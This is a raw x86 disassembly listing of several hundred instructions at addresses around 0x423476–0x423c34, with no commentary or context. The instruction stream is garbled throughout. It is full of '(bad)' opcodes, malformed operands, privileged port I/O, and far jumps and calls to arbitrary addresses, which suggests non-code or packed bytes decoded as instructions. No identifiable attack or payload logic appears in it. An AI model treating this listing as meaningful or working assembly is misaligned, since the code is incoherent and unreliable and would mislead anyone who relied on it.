  423476:	shl    bl,cl
  423478:	es xchg ebx,eax
  42347a:	test   DWORD PTR ds:0xe1d27abb,eax
  423480:	jmp    0xf75a:0xa3a5924c
  423487:	push   eax
  423488:	pop    esi
  423489:	sbb    BYTE PTR [edi+ecx*1],al
  42348c:	dec    ecx
  42348d:	js     0x42350a
  42348f:	mov    DWORD PTR [ebx],ebp
  423491:	out    dx,eax
  423492:	mov    ah,0x36
  423494:	lock push 0x66
  423497:	out    0x69,al
  423499:	xchg   esp,eax
  42349a:	mov    edx,0xe014e3ec
  42349f:	xchg   dh,ah
  4234a1:	in     eax,dx
  4234a2:	mov    WORD PTR [ebx],ax
  4234a5:	aad    0xdd
  4234a7:	push   ebp
  4234a8:	in     eax,0x15
  4234aa:	inc    ecx
  4234ab:	push   ecx
  4234ac:	arpl   WORD PTR [edi-0x4c082dec],si
  4234b2:	daa    
  4234b3:	inc    ebx
  4234b4:	fistp  WORD PTR [edx+0x1]
  4234b7:	and    eax,0xd412afb6
  4234bc:	fstp   DWORD PTR [ecx-0x20c1d28f]
  4234c2:	ffreep st(7)
  4234c4:	das    
  4234c5:	call   0x97dab630
  4234ca:	cwde   
  4234cb:	mov    ds:0xed227845,eax
  4234d0:	mov    cl,0x2
  4234d2:	push   cs
  4234d3:	je     0x4234e2
  4234d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234d6:	cmp    eax,0x1fce74a4
  4234db:	stc    
  4234dc:	test   BYTE PTR [ebx],bh
  4234de:	push   eax
  4234df:	jbe    0x4234ef
  4234e1:	and    ebx,DWORD PTR [eax+0x2fb1507c]
  4234e7:	jmp    0x33ab1afd
  4234ec:	ins    BYTE PTR es:[edi],dx
  4234ed:	mov    ah,0x2d
  4234ef:	in     al,0x1
  4234f1:	in     eax,0x16
  4234f3:	sti    
  4234f4:	scas   eax,DWORD PTR es:[edi]
  4234f5:	push   0x45
  4234f7:	sbb    ebx,DWORD PTR [ecx+eiz*8+0x4a]
  4234fb:	push   0xffffffa9
  4234fd:	sub    DWORD PTR [eax],esi
  4234ff:	ins    DWORD PTR es:[edi],dx
  423500:	ins    BYTE PTR es:[edi],dx
  423501:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423502:	mov    edx,0x10c972cb
  423507:	sbb    bh,BYTE PTR [eax]
  423509:	mov    ah,0x89
  42350b:	mov    ?,WORD PTR [esi-0x311fda21]
  423511:	jo     0x42356c
  423513:	or     esp,esp
  423515:	adc    eax,0x229d248f
  42351a:	in     eax,0x2c
  42351c:	scas   eax,DWORD PTR es:[edi]
  42351d:	mov    ch,0xc4
  42351f:	fbstp  TBYTE PTR [ebx+0xf]
  423522:	(bad)  
  423523:	pop    eax
  423524:	fisub  DWORD PTR [ecx]
  423526:	jbe    0x423562
  423528:	mov    bl,0x47
  42352a:	add    ebx,eax
  42352c:	or     al,0x76
  42352e:	sub    al,0x99
  423530:	ror    BYTE PTR [esi+0x34ac16a],0x62
  423537:	inc    BYTE PTR [ecx+0x48]
  42353a:	lods   eax,DWORD PTR ds:[esi]
  42353b:	push   ds
  42353c:	les    ebx,FWORD PTR [ebp+edx*1+0x1]
  423540:	(bad)  
  423542:	or     esi,ebx
  423544:	(bad)  
  423545:	fild   QWORD PTR [edx+edx*8]
  423548:	sub    eax,0xfd5ab6b3
  42354d:	bound  edi,QWORD PTR [ebx-0x6d624006]
  423553:	jns    0x42352c
  423555:	sbb    DWORD PTR [ebp-0x37c2d337],0xa1a71f76
  42355f:	dec    edi
  423560:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423561:	fsubr  DWORD PTR [ebp-0xa70c429]
  423567:	stos   DWORD PTR es:[edi],eax
  423568:	fdiv   DWORD PTR [esi]
  42356a:	imul   ebx,DWORD PTR [edx+edi*8-0x41d381fa],0x5fcd91ed
  423575:	out    dx,eax
  423576:	pop    ds
  423577:	pop    esp
  423578:	retf   0xfee3
  42357b:	sbb    BYTE PTR [edx],ch
  42357d:	cmp    ebx,edx
  42357f:	add    edi,DWORD PTR ds:0xc2929c07
  423585:	push   cs
  423586:	jecxz  0x4235ae
  423588:	divps  xmm2,XMMWORD PTR [esi]
  42358b:	into   
  42358c:	sbb    BYTE PTR [ebx],0xf6
  42358f:	mov    bl,0x1
  423591:	cmp    edx,DWORD PTR ds:0xcf0e78d8
  423597:	ret    0xafb
  42359a:	adc    DWORD PTR [edi-0x416fc59b],0x24
  4235a1:	adc    eax,0xf22a5f24
  4235a6:	push   es
  4235a7:	add    eax,0xba01bb69
  4235ac:	imul   edi,DWORD PTR [esi-0x42de52be],0x2346e88f
  4235b6:	pop    edi
  4235b7:	call   DWORD PTR [ebx+0x6e]
  4235ba:	mov    ds:0xfc1ede69,eax
  4235bf:	adc    cl,ch
  4235c1:	add    ecx,DWORD PTR [ecx-0xd2b8e3d]
  4235c7:	ret    
  4235c8:	jl     0x42360b
  4235ca:	jnp    0x423574
  4235cc:	aam    0x27
  4235ce:	arpl   WORD PTR [eax+0x5108b179],bx
  4235d4:	imul   edx,edi,0x5c
  4235d7:	xchg   BYTE PTR [ebp-0x52b59da7],dh
  4235dd:	mov    bh,0xd6
  4235df:	int3   
  4235e0:	enter  0x6a4f,0x15
  4235e4:	jno    0x4235dc
  4235e6:	sahf   
  4235e7:	inc    esi
  4235e8:	push   ds
  4235e9:	(bad)  
  4235ea:	cmp    ebp,DWORD PTR [eax]
  4235ec:	aaa    
  4235ed:	xchg   ebp,eax
  4235ee:	sbb    bh,BYTE PTR ds:0x9a34ab96
  4235f4:	adc    ebp,eax
  4235f6:	jle    0x42365c
  4235f8:	sub    BYTE PTR [esi],dh
  4235fa:	ror    BYTE PTR [esi],0xa8
  4235fd:	push   ecx
  4235fe:	arpl   ax,bp
  423600:	aam    0x6c
  423602:	outs   dx,BYTE PTR ds:[esi]
  423603:	add    BYTE PTR [edi+0xd],ch
  423606:	aam    0xe6
  423608:	xchg   BYTE PTR ds:0x63caedbd,dh
  42360e:	retf   0x5918
  423611:	aaa    
  423612:	dec    esp
  423613:	xor    DWORD PTR [edx],edx
  423615:	cmc    
  423616:	jle    0x42367c
  423618:	(bad)  
  42361a:	xor    ah,0x85
  42361d:	shl    BYTE PTR [edi],cl
  42361f:	push   DWORD PTR [esi-0x6dc33a12]
  423625:	out    dx,al
  423626:	add    eax,0xa1b5c721
  42362b:	jno    0x42365a
  42362d:	(bad)  
  42362e:	dec    esi
  42362f:	sbb    bl,BYTE PTR [ecx-0x7912dacb]
  423635:	mov    ebp,0x7769f2ff
  42363a:	cld    
  42363b:	test   al,0x8
  42363d:	mov    edi,0x23e0811d
  423642:	outs   dx,DWORD PTR ds:[esi]
  423643:	call   0x925320c4
  423648:	xchg   ecx,eax
  423649:	sub    al,0x48
  42364b:	cli    
  42364c:	jg     0x423647
  42364e:	or     al,0x61
  423650:	add    BYTE PTR [ebp-0x17423ed4],ah
  423656:	inc    ebp
  423657:	ss ja  0x4236b1
  42365a:	clc    
  42365b:	xchg   edi,eax
  42365c:	sbb    dl,BYTE PTR [esi]
  42365e:	ins    DWORD PTR es:[edi],dx
  42365f:	out    dx,al
  423660:	jo     0x423647
  423662:	xchg   edx,eax
  423663:	sbb    DWORD PTR [ebx-0x64162eb4],eax
  423669:	shl    dl,cl
  42366b:	xchg   edi,eax
  42366c:	or     eax,0x81d8272f
  423671:	or     eax,0x7a6de1f8
  423676:	cmp    edi,esi
  423678:	call   0x874a:0x849fe5a9
  42367f:	mov    bl,BYTE PTR [eax]
  423681:	enter  0x4b2a,0x4e
  423685:	pop    esp
  423686:	sub    edx,ecx
  423688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423689:	clc    
  42368a:	sbb    ebp,edi
  42368c:	in     al,dx
  42368d:	and    al,BYTE PTR [esi]
  42368f:	into   
  423690:	fnsave [edx]
  423692:	add    BYTE PTR [edx-0x770a245e],0xb9
  423699:	mov    al,ds:0xfcb22745
  42369e:	cmp    dl,BYTE PTR [eax+ebx*2+0x10]
  4236a2:	inc    eax
  4236a3:	std    
  4236a4:	sub    dh,BYTE PTR [esi]
  4236a6:	gs cmc 
  4236a8:	cld    
  4236a9:	mov    ch,0x25
  4236ab:	mov    dl,0xab
  4236ad:	(bad)  
  4236ae:	data16 fdiv DWORD PTR [ebx+0x7b4a8695]
  4236b5:	mov    ebp,0x93a07639
  4236ba:	mov    ebx,0x919a8444
  4236bf:	scas   eax,DWORD PTR es:[edi]
  4236c0:	push   0xffffffe0
  4236c2:	fwait
  4236c3:	sub    ecx,DWORD PTR [eax]
  4236c5:	lods   eax,DWORD PTR ds:[esi]
  4236c6:	xchg   edx,eax
  4236c7:	push   esi
  4236c8:	dec    esi
  4236c9:	fidiv  DWORD PTR [esi]
  4236cb:	mov    al,0xab
  4236cd:	mov    BYTE PTR [ebx-0x69],ah
  4236d0:	sbb    ebp,DWORD PTR [eax+0x59]
  4236d3:	mov    ch,0xbe
  4236d5:	sti    
  4236d6:	sbb    eax,0x37d06750
  4236db:	add    eax,0xb54a544a
  4236e0:	or     cl,BYTE PTR [edi+ebx*2]
  4236e3:	sub    BYTE PTR [ecx],ch
  4236e5:	loope  0x4236a1
  4236e7:	ins    DWORD PTR es:[edi],dx
  4236e8:	std    
  4236e9:	cmp    al,0x96
  4236eb:	push   cs
  4236ec:	retf   0x41a0
  4236ef:	or     BYTE PTR [edx+0x51986a0c],bl
  4236f5:	adc    eax,0xf8341f1
  4236fa:	adc    al,0xa5
  4236fc:	xor    eax,0x4f4d3366
  423701:	imul   ecx,DWORD PTR es:[ecx],0xc2334ad1
  423708:	push   ds
  423709:	mov    dl,0x80
  42370b:	mov    bh,0x5f
  42370d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42370e:	repnz fimul DWORD PTR [eax-0x46]
  423712:	rcr    DWORD PTR [ebx-0x792f1cc8],0xad
  423719:	adc    esp,DWORD PTR [esi+0x5]
  42371c:	push   es
  42371d:	int    0x90
  42371f:	enter  0xb5e3,0x40
  423723:	aad    0x36
  423725:	inc    esi
  423726:	in     eax,dx
  423727:	ss out 0x93,al
  42372a:	dec    esp
  42372b:	dec    edi
  42372c:	mov    al,BYTE PTR [eax-0x66]
  42372f:	cs jns 0x423778
  423732:	jecxz  0x4236bd
  423734:	rol    BYTE PTR [ebx*8-0x6a3f6fcf],1
  42373b:	add    DWORD PTR [edx],edi
  42373d:	adc    BYTE PTR es:[edx],dh
  423740:	mov    esi,0x77960951
  423745:	test   bl,bh
  423747:	cmp    DWORD PTR [edx],edi
  423749:	fs inc ecx
  42374b:	jb     0x4237b8
  42374d:	lahf   
  42374e:	fstp   TBYTE PTR [ebp+0x25]
  423751:	popf   
  423752:	xchg   BYTE PTR ds:0xdeedd256,bh
  423758:	inc    esi
  423759:	xchg   edi,eax
  42375a:	push   es
  42375b:	scas   eax,DWORD PTR es:[edi]
  42375c:	test   DWORD PTR [esi+0x16574313],edi
  423762:	mov    eax,ds:0x7959f927
  423767:	imul   esi,DWORD PTR ds:[edi-0x1c],0x54c0f38c
  42376f:	push   ebp
  423770:	inc    esp
  423771:	or     ebp,0xffffffc7
  423774:	dec    edx
  423775:	mov    cl,0x7c
  423777:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423778:	or     dh,BYTE PTR [esi-0x3e1351cc]
  42377e:	enter  0xdf5c,0xe3
  423782:	adc    BYTE PTR [esi+esi*4+0x5d],ah
  423786:	or     edx,DWORD PTR [eax+0x73]
  423789:	fdiv   st(2),st
  42378b:	mov    esi,0x84c5100a
  423790:	push   edi
  423791:	jp     0x42380e
  423793:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423794:	out    dx,eax
  423795:	call   0x28a0:0x3296023
  42379c:	pop    es
  42379d:	data16 fmul QWORD PTR [ebx]
  4237a0:	in     eax,0x32
  4237a2:	push   esi
  4237a3:	xor    DWORD PTR [ebx-0x47],ebp
  4237a6:	es call 0x9bcc:0x7b0d8597
  4237ae:	jmp    DWORD PTR [ecx+ebp*4]
  4237b1:	inc    esp
  4237b2:	arpl   WORD PTR [edx],bp
  4237b4:	(bad)  
  4237b5:	(bad)  
  4237b6:	cli    
  4237b7:	fiadd  DWORD PTR [esi]
  4237b9:	scas   al,BYTE PTR es:[edi]
  4237ba:	cli    
  4237bb:	jg     0x42373f
  4237bd:	ins    DWORD PTR es:[edi],dx
  4237be:	retf   
  4237bf:	add    eax,0xcc32c97f
  4237c4:	sub    eax,ebp
  4237c6:	mov    ds:0xb4809e3e,eax
  4237cb:	ret    
  4237cc:	jae    0x423796
  4237ce:	inc    esp
  4237cf:	or     DWORD PTR [edx-0x17],0xa671fe37
  4237d6:	(bad)  
  4237d7:	lahf   
  4237d8:	sub    eax,0x52108655
  4237dd:	push   ebx
  4237df:	les    ecx,FWORD PTR [esi+0x3a]
  4237e2:	sub    al,0x60
  4237e4:	xor    al,0x63
  4237e6:	addr16 das 
  4237e8:	ds (bad) 
  4237ea:	xchg   esp,eax
  4237eb:	and    al,0x64
  4237ed:	dec    edx
  4237ee:	dec    esi
  4237ef:	stc    
  4237f0:	das    
  4237f1:	inc    ebp
  4237f2:	cmc    
  4237f3:	retf   0xf2d4
  4237f6:	gs shr eax,cl
  4237f9:	adc    DWORD PTR [eax],eax
  4237fb:	mov    eax,0x2ea2f1a7
  423800:	shl    BYTE PTR [ecx-0x2e0a45e0],0x99
  423807:	xor    eax,0x8ddca8d5
  42380c:	mov    eax,0x1dcbd171
  423811:	call   0xd2f8adb8
  423816:	dec    esi
  423817:	daa    
  423818:	pop    es
  423819:	push   es
  42381a:	call   0xed560650
  42381f:	add    eax,0xd8ac9807
  423824:	rcl    DWORD PTR [ebx],1
  423826:	sbb    al,0xd
  423828:	mov    es,WORD PTR [eax+eax*2-0xe10bbdf]
  42382f:	push   ds
  423830:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423831:	mov    dl,0x46
  423833:	not    BYTE PTR [ecx]
  423835:	pop    ebx
  423836:	les    eax,FWORD PTR [ebx]
  423838:	mov    ah,0x5
  42383a:	daa    
  42383b:	cmp    bl,BYTE PTR [eax-0x60149175]
  423841:	jmp    0xc9:0x423b9511
  423848:	adc    dh,BYTE PTR [edi+0x2e2f5332]
  42384e:	pop    edi
  42384f:	mov    cl,0x56
  423851:	je     0x4238bd
  423853:	fsub   st,st(4)
  423855:	add    ah,al
  423857:	jne    0x4238cf
  423859:	rep ins BYTE PTR es:[edi],dx
  42385b:	fwait
  42385c:	mov    ah,bl
  42385e:	sahf   
  42385f:	push   0xffffffaf
  423861:	xchg   bl,dh
  423863:	cmp    dh,dh
  423865:	mov    dh,0xf1
  423867:	xchg   esp,eax
  423868:	data16 mov ah,0xd1
  42386b:	stos   DWORD PTR es:[edi],eax
  42386c:	fld    DWORD PTR [edi-0x6b]
  42386f:	cwde   
  423870:	mov    dl,0xe9
  423872:	bound  esi,QWORD PTR [edi+0x23]
  423875:	xchg   BYTE PTR [edx+0x23eb86cc],cl
  42387b:	dec    ecx
  42387c:	push   cs
  42387d:	daa    
  42387e:	xlat   BYTE PTR ds:[ebx]
  42387f:	jge    0x4238fe
  423881:	jbe    0x423869
  423883:	mov    edx,0xb0aba399
  423888:	in     al,dx
  423889:	(bad)
  42388d:	xor    BYTE PTR [ecx],dl
  42388f:	popf   
  423890:	pop    ecx
  423891:	out    dx,eax
  423892:	and    dh,BYTE PTR [edx+0x45642803]
  423898:	outs   dx,DWORD PTR ds:[esi]
  423899:	enter  0x7cde,0x83
  42389d:	adc    al,BYTE PTR [esi+0x1029e98f]
  4238a3:	stos   DWORD PTR es:[edi],eax
  4238a4:	mov    esi,0xad12b768
  4238a9:	push   cs
  4238aa:	xchg   edx,eax
  4238ab:	jae    0x42391f
  4238ad:	add    ecx,DWORD PTR [ebx+edx*2-0x62eeb2e7]
  4238b4:	sar    ebx,0x3d
  4238b7:	mov    ebx,0x5c8e1cd0
  4238bc:	xor    DWORD PTR [edi-0x30234c1f],ecx
  4238c2:	pushf  
  4238c3:	xchg   edi,eax
  4238c4:	js     0x4238b4
  4238c6:	add    al,0x73
  4238c8:	bound  esp,QWORD PTR [edi+eiz*1-0x4f]
  4238cc:	mov    ch,0xe2
  4238ce:	mov    DWORD PTR [ecx+edi*1-0x3a],esp
  4238d2:	mov    bl,0x34
  4238d4:	mov    ebx,0xf5ca5939
  4238d9:	or     eax,0xf1d0176
  4238de:	mov    gs,WORD PTR [edi]
  4238e0:	sahf   
  4238e1:	jno    0x4238a0
  4238e3:	mov    ebp,0x820e5c9a
  4238e8:	shl    DWORD PTR cs:0x7ebad7f5,0xf1
  4238f0:	fnsave [ebp-0x77]
  4238f3:	je     0x423943
  4238f5:	ins    DWORD PTR es:[edi],dx
  4238f6:	pop    ss
  4238f7:	ss and al,0xb7
  4238fa:	mov    ebp,0x73801fd6
  4238ff:	sub    edi,ebx
  423901:	outs   dx,BYTE PTR ds:[esi]
  423902:	jecxz  0x423945
  423904:	sbb    DWORD PTR [ecx],ebp
  423906:	out    dx,eax
  423907:	pop    edi
  423908:	or     al,0xbc
  42390a:	or     al,0x3e
  42390c:	cmp    ax,0x940
  423910:	jns    0x423970
  423912:	dec    edi
  423913:	psrad  mm0,QWORD PTR [ecx+0x30]
  423917:	mov    bh,0x40
  423919:	aaa    
  42391a:	jns    0x423991
  42391c:	mov    al,ds:0x60c39512
  423921:	xchg   edx,eax
  423922:	mov    eax,DWORD PTR [ebx]
  423924:	in     al,0xc5
  423926:	out    0x98,eax
  423928:	into   
  423929:	ds jp  0x4238fd
  42392c:	jmp    0x95b66d44
  423931:	cmp    dl,BYTE PTR [edx-0x5]
  423934:	mov    dh,BYTE PTR [esi+0x57af6862]
  42393a:	mov    ecx,0x7e9b7808
  42393f:	lea    edx,fs:[eax+0x16]
  423943:	mov    ah,0x3
  423945:	mov    esp,0xc206e471
  42394a:	push   ss
  42394b:	rcl    DWORD PTR [ebx+0x78bfe658],1
  423951:	shl    ch,0x75
  423954:	ja     0x42398e
  423956:	push   esp
  423957:	ins    DWORD PTR es:[edi],dx
  423958:	xor    bh,BYTE PTR [edi+ebp*8]
  42395b:	fcmovb st,st(2)
  42395d:	inc    esi
  42395e:	or     DWORD PTR [edx],esp
  423960:	es add esp,eax
  423963:	fimul  WORD PTR [eax]
  423965:	in     al,dx
  423966:	sub    al,0x50
  423968:	sbb    bh,BYTE PTR [ecx+0x78]
  42396b:	imul   edi,DWORD PTR [ecx-0x49a549a6],0xffffffeb
  423972:	loope  0x4239af
  423974:	out    dx,eax
  423975:	pop    ebp
  423976:	push   ecx
  423977:	fild   DWORD PTR [ecx+0x41]
  42397a:	mov    ds:0x13efaedb,al
  42397f:	leave  
  423980:	add    bh,BYTE PTR [ebx-0x17262452]
  423986:	int3   
  423987:	mov    WORD PTR [di+0x2b],?
  42398b:	(bad)  
  42398c:	cmp    DWORD PTR [eiz*4-0xbc8ca34],edi
  423993:	adc    DWORD PTR [ecx],edx
  423995:	cli    
  423996:	pop    ss
  423997:	loopne 0x423963
  423999:	hlt    
  42399a:	fwait
  42399b:	jmp    0x423a14
  42399d:	repz fdivrp st(2),st
  4239a0:	das    
  4239a1:	mov    bh,0xce
  4239a3:	push   ebp
  4239a4:	xchg   edx,eax
  4239a5:	leave  
  4239a6:	rcr    ecx,0x1f
  4239a9:	adc    dh,bl
  4239ab:	inc    edx
  4239ac:	mov    ch,0xe9
  4239ae:	mov    BYTE PTR [esi-0x36003637],ah
  4239b4:	pusha  
  4239b5:	fisttp DWORD PTR [ebx]
  4239b7:	lods   al,BYTE PTR ds:[esi]
  4239b8:	adc    ecx,DWORD PTR [ebp-0x39e7e997]
  4239be:	cmp    esp,eax
  4239c0:	shr    DWORD PTR [edi+eax*1+0x2563dc32],1
  4239c7:	push   cs
  4239c8:	nop
  4239c9:	jp     0x4239c6
  4239cb:	fmul   DWORD PTR [ecx-0x3d]
  4239ce:	mov    BYTE PTR [edx-0x60],al
  4239d1:	popa   
  4239d2:	mov    ch,0xbb
  4239d4:	shl    DWORD PTR [edx],0xf1
  4239d7:	sti    
  4239d8:	jnp    0x4239a8
  4239da:	in     al,0xa9
  4239dc:	push   es
  4239dd:	push   edi
  4239de:	pop    ebp
  4239df:	sbb    edi,ebp
  4239e1:	or     BYTE PTR [ebp-0x3dd40df3],0x33
  4239e8:	pmuludq mm5,mm7
  4239eb:	ficomp DWORD PTR [eax+edi*1-0x54]
  4239ef:	(bad)  
  4239f0:	mov    esi,0xa55f06c5
  4239f5:	jbe    0x4239c7
  4239f7:	outs   dx,BYTE PTR ds:[esi]
  4239f9:	xor    BYTE PTR [ecx-0x30],cl
  4239fc:	xor    eax,0x69eaebe1
  423a01:	xor    ch,dh
  423a03:	ins    BYTE PTR es:[edi],dx
  423a04:	in     al,0xc
  423a06:	mov    esp,0xf3ca171f
  423a0b:	adc    ebp,DWORD PTR [ecx+0x48ee7d29]
  423a11:	mov    ds:0x784b0a2b,al
  423a16:	out    dx,al
  423a17:	push   ss
  423a18:	xor    eax,0xac57cece
  423a1d:	in     al,0x12
  423a1f:	in     al,dx
  423a20:	cdq    
  423a21:	and    bl,BYTE PTR [ebp+0x23]
  423a24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a25:	es call 0xf1b8:0x53e3209e
  423a2d:	dec    ebp
  423a2e:	iret   
  423a2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a30:	mov    ebp,0x7d1f1888
  423a35:	retf   0xacef
  423a38:	dec    ebp
  423a39:	ret    
  423a3a:	push   eax
  423a3b:	sub    BYTE PTR [ecx],ch
  423a3d:	jnp    0x423a77
  423a3f:	xchg   edx,eax
  423a40:	or     al,0x74
  423a42:	sbb    DWORD PTR [ecx+ebp*2],edi
  423a45:	idiv   BYTE PTR [edx]
  423a47:	sub    eax,0x5c8bed43
  423a4c:	(bad)  
  423a4d:	mov    al,ds:0x201e8179
  423a52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a53:	sub    DWORD PTR [edx-0xcc96146],eax
  423a59:	mov    ah,0x24
  423a5b:	imul   DWORD PTR [esi]
  423a5d:	dec    ebx
  423a5e:	pop    edi
  423a5f:	xor    bl,BYTE PTR [esi]
  423a61:	jg     0x423a18
  423a63:	dec    ecx
  423a64:	and    ebx,esi
  423a66:	mov    bl,0x82
  423a68:	xor    ch,BYTE PTR [edx]
  423a6a:	and    bl,BYTE PTR [si-0x80]
  423a6e:	inc    eax
  423a6f:	mov    ebx,0x91e85097
  423a74:	xchg   ebx,eax
  423a75:	mov    bh,0xa0
  423a77:	test   eax,0x527f8c07
  423a7c:	xlat   BYTE PTR ds:[ebx]
  423a7d:	inc    esp
  423a7e:	out    dx,eax
  423a7f:	xchg   ecx,eax
  423a80:	mov    ecx,DWORD PTR [ebp+0x18804a7f]
  423a86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a87:	and    esp,DWORD PTR [eax]
  423a89:	cs sbb al,0x53
  423a8c:	mov    al,al
  423a8e:	es xchg ebx,eax
  423a90:	mov    ecx,0x59abb4ea
  423a95:	sbb    al,0x33
  423a97:	mov    al,0x6f
  423a99:	sti    
  423a9a:	clc    
  423a9b:	mov    esi,?
  423a9d:	mov    esi,0x42ad72a7
  423aa2:	loop   0x423b15
  423aa4:	push   edi
  423aa5:	shl    edi,1
  423aa7:	ret    
  423aa8:	or     BYTE PTR [ecx-0x107873c7],bl
  423aae:	jmp    0x423a8d
  423ab0:	xchg   esp,eax
  423ab1:	adc    eax,0xfd41de32
  423ab6:	push   edi
  423ab7:	call   0xd0ac:0xec3fdcfa
  423abe:	test   DWORD PTR [edx-0x3d],eax
  423ac1:	xchg   edx,eax
  423ac2:	mov    bl,0x73
  423ac4:	and    BYTE PTR [ebp+0x25],bh
  423ac7:	imul   edx,DWORD PTR [edx+0x74],0xffffffb6
  423acb:	push   ebp
  423acc:	pop    eax
  423acd:	ins    BYTE PTR es:[edi],dx
  423ace:	rol    DWORD PTR [edi-0x5208efd7],0xee
  423ad5:	rol    BYTE PTR [eax],cl
  423ad7:	xor    al,0x16
  423ad9:	push   edx
  423ada:	loope  0x423b0e
  423adc:	pop    esp
  423add:	mov    es,WORD PTR [ebx+0x137b22c8]
  423ae3:	pop    edi
  423ae4:	data16 sub BYTE PTR [ebx],cl
  423ae7:	outs   dx,BYTE PTR ds:[esi]
  423ae8:	pop    edi
  423ae9:	icebp  
  423aea:	jecxz  0x423afe
  423aec:	mov    WORD PTR [esi+0x27f16f26],ds
  423af2:	xchg   BYTE PTR [esi+0x62],dl
  423af5:	inc    ecx
  423af6:	adc    bh,bl
  423af8:	shl    BYTE PTR [edx],cl
  423afa:	pop    esp
  423afb:	cld    
  423afc:	push   edx
  423afd:	cmp    edi,DWORD PTR [ecx-0x22]
  423b00:	addr16 lock push 0xffffffdb
  423b04:	outs   dx,DWORD PTR ds:[esi]
  423b05:	push   esp
  423b06:	mov    dl,0x4
  423b08:	icebp  
  423b09:	dec    esp
  423b0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b0b:	ja     0x423a94
  423b0d:	mov    esi,0x6136f9e7
  423b12:	pop    es
  423b13:	sahf   
  423b14:	cmp    BYTE PTR [ecx-0x7b32a7c2],0x84
  423b1b:	cdq    
  423b1c:	sub    DWORD PTR [eax+0x10],ebx
  423b1f:	frstor [edx-0x33]
  423b22:	jb     0x423aea
  423b24:	loop   0x423b65
  423b26:	ror    DWORD PTR [eax+0x3d238b94],1
  423b2c:	fmulp  st(6),st
  423b2e:	lds    ebp,FWORD PTR [esi-0x97c1ab1]
  423b34:	out    dx,al
  423b35:	dec    eax
  423b36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b37:	jno    0x423ba6
  423b39:	(bad)  
  423b3a:	cdq    
  423b3b:	fist   DWORD PTR [edi]
  423b3d:	pop    ebx
  423b3e:	jle    0x423b83
  423b40:	inc    edi
  423b41:	or     BYTE PTR [ecx],0xd9
  423b44:	jo     0x423bbf
  423b46:	xchg   BYTE PTR [ecx],cl
  423b48:	mov    esp,0x4be6d2ed
  423b4d:	sti    
  423b4e:	call   0xedbd:0xed0283e
  423b55:	int3   
  423b56:	xchg   DWORD PTR [ebx-0x7d],ecx
  423b59:	xor    esp,DWORD PTR [eax]
  423b5b:	outs   dx,BYTE PTR ds:[esi]
  423b5c:	jbe    0x423b9d
  423b5e:	icebp  
  423b5f:	test   DWORD PTR [eax],esi
  423b61:	dec    esi
  423b62:	and    DWORD PTR [ebx],0x36
  423b65:	ss ja  0x423b18
  423b68:	lahf   
  423b69:	push   eax
  423b6a:	popa   
  423b6b:	jmp    0x97e0:0x7444b034
  423b72:	in     al,0x38
  423b74:	popf   
  423b75:	sbb    eax,0x1864f437
  423b7a:	pop    ecx
  423b7b:	add    edi,ecx
  423b7d:	mov    ch,BYTE PTR [ebp+esi*2+0x6d]
  423b81:	and    DWORD PTR [esp+esi*1],0xffffff9a
  423b85:	xor    eax,0xf89f2e79
  423b8a:	mov    ch,0xb8
  423b8c:	and    eax,0xf58fa9e9
  423b91:	sub    ecx,DWORD PTR [edi-0x7614455]
  423b97:	in     eax,0x89
  423b99:	sub    eax,0x1fedf9a7
  423b9e:	cmp    al,BYTE PTR [edx]
  423ba0:	mov    ?,WORD PTR [eax-0x773d646e]
  423ba6:	xor    ebx,DWORD PTR [edx]
  423ba8:	adc    DWORD PTR [eax+0x221a2865],ebx
  423bae:	aad    0xfd
  423bb0:	xor    cl,BYTE PTR [eax-0x60]
  423bb3:	aaa    
  423bb4:	or     eax,0xa5b890aa
  423bb9:	ficom  DWORD PTR ds:0xec779f68
  423bbf:	jns    0x423bd2
  423bc1:	push   ebx
  423bc2:	pop    ds
  423bc3:	lahf   
  423bc4:	jl     0x423b51
  423bc6:	push   es
  423bc7:	mov    ds:0x8d019c6b,al
  423bcc:	dec    eax
  423bcd:	cmp    edx,DWORD PTR [ebx+eiz*4+0x61]
  423bd1:	inc    esi
  423bd2:	(bad)  
  423bd3:	das    
  423bd4:	aam    0x87
  423bd6:	adc    al,0x3d
  423bd8:	inc    esi
  423bd9:	jbe    0x423c3d
  423bdb:	or     al,0xd9
  423bdd:	shl    DWORD PTR fs:[ebx],cl
  423be0:	adc    DWORD PTR [eax+0x6037595a],ecx
  423be6:	test   edi,0xab105098
  423bec:	(bad)  
  423bed:	and    esi,edx
  423bef:	push   esi
  423bf0:	mov    ecx,0xfd792f9b
  423bf5:	xor    bl,ah
  423bf7:	adc    DWORD PTR [edx+0x29],0x55
  423bfb:	or     edx,edi
  423bfd:	ins    BYTE PTR es:[edi],dx
  423bfe:	out    dx,al
  423bff:	xchg   esi,eax
  423c00:	cmp    ebx,DWORD PTR [ebx]
  423c02:	or     eax,DWORD PTR [edi-0x64]
  423c05:	imul   eax,ebp,0xffffff9f
  423c08:	in     eax,0x93
  423c0a:	xor    eax,DWORD PTR [edx-0xd28f9c9]
  423c10:	dec    edx
  423c11:	dec    ebx
  423c12:	loop   0x423c4b
  423c14:	and    edi,DWORD PTR [eax]
  423c16:	cmp    al,0x93
  423c18:	mov    ebp,0x1ce10a23
  423c1d:	xchg   ebx,eax
  423c1e:	scas   eax,DWORD PTR es:[edi]
  423c1f:	or     DWORD PTR [eax],0xffffffd4
  423c22:	(bad)  
  423c23:	xchg   ebp,eax
  423c24:	stc    
  423c25:	lods   eax,DWORD PTR ds:[esi]
  423c27:	or     bh,BYTE PTR [esi+0x68]
  423c2a:	sub    BYTE PTR [esi],ah
  423c2c:	jb     0x423c13
  423c2e:	cmp    ebx,DWORD PTR [eax+0x2c]
  423c31:	loope  0x423c8f
  423c33:	dec    edx
  423c34:	xchg   al,dh
